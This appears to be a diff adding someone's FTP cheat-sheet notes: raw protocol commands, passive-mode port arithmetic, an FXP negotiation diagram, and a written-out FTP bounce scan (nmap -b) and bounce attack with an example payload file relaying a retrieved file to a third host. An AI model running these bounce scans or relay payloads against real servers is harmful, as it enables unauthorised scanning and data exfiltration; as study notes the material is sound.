@@ -8,3 +8,132 @@ ls
 mkdir
 put/mput
 mkdir/rmdir
+
+
+
+TELNET
+telnet 111.11.1.111 21
+
+RAW COMMANDS
+	auth
+USER uname
+PASS pass
+
+	information
+SYST Retrieves type of system of the server
+STAT
+HOST
+CSID
+ACCT
+
+	connection/transfer modes
+PASV
+EPSV
+SPSV
+MODE <block,stream,compress>
+
+	file transfer/filesystem
+NLST
+PWD
+CWD dir
+DSIZ	get directory size
+RETR obj
+DELE obj
+MKD
+RMD
+RNFR
+RNTO
+SIZE obj
+SMNT	filesystem mount
+ABOR
+
+FUCNTION COMMANDS
+SITE HELP
+PORT 111,11,1,111,10,24
+EPRT |1|111,11,1,111|12321|
+EPRT |2|<ipv6>|12321|
+SITE IDLE 60
+SITE UMASK 002
+
+
+	stayalive/quit
+NOOP
+REIN
+QUIT
+
+
+Passive mode
+first 4 numbers are IP address, final 2 are port number representation
+Port representation:
+	bytes, bits
+		e.g. 10,10
+		10*256 + 10 = 2570
+		thus data port for this FTP connection will be port number 2570
+
+FXP
+	-site-to-site FTP server fileshare protocol
+	--vuln to ftp bounce attacks
+USING PASSIVE MODE
+telnet 111.11.1.111 21
+USER uname
+PASS pass
+PASV
+PORT 111,11,1,111,10,24
+
+USING EXTEND PASSIVE MODE
+telnet 111.11.1.111 21
+USER uname
+PASS pword
+EPSV
+NLST
+EPRT |1|111,11,1,111|12321
+
+ftp target.dom
+>USER: uname
+>PASS: pword
+passive
+nmap
+nlist
+
+FTP Bounce Scan
+nmap -v -Pn -b user:pass@vuln.dom:21 target.dom
+nmap -v -Pn -b user:pass@target.dom:21 127.0.0.1
+	--expect slow scan rate
+	--fair likelyhood of ftp port command does not allow requests to priviliged ports 1-1024
+	--common vuln on FXP-enabled FTP servers
+
+	Bounce Attack
+		Conn2server1
+ftp 10.11.1.11
+quote "pasv"
+quote "stor foobar"
+		Example bounce payload, let's name the file 'instrs'
+user ftpunker
+pass anon.e.moose
+cwd /fancy
+type i
+port 111,11,1,11,12,111
+retr cipher.tgz
+quit
+^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@ ... ^@^@^@^@
+^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@ ... ^@^@^@^@
+...
+		Conn2server2 - Upload and execute
+ftp 111.11.1.11
+put isntrs
+quote "port 111,11,1,11,11,111"
+quote "retr instrs"
+
+
+
+Example of FXP negotiation
+        User-PI - Server A  (Dest)              User-PI - Server B  (Source)
+        ------------------                      ------------------
+       
+        C->A : Connect                          C->B : Connect
+        C->A : PASV
+        A->C : 227 Entering Passive Mode. A1,A2,A3,A4,a1,a2
+                                                C->B : PORT A1,A2,A3,A4,a1,a2
+                                                B->C : 200 Okay
+        C->A : STOR                             C->B : RETR
+                   B->A : Connect to HOST-A, PORT-a
